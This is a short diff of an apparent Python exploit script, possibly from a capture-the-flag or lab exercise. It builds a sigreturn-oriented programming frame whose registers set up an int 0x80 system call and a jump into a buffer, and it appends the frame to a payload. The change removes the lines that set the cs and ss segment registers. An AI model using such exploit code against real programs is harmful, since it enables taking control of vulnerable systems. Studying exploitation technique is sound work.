@@ -52,8 +52,6 @@ frame.set_regvalue("edx", 0x7)
 frame.set_regvalue("ebp", 0xbffdf000)
 frame.set_regvalue("eip", INT_80)
 frame.set_regvalue("esp", buffer_address + 84)
-frame.set_regvalue("cs", 0x73)
-frame.set_regvalue("ss", 0x7b)
 
 sploit += frame.get_frame()
 sploit += struct.pack("<I", buffer_address + 88)
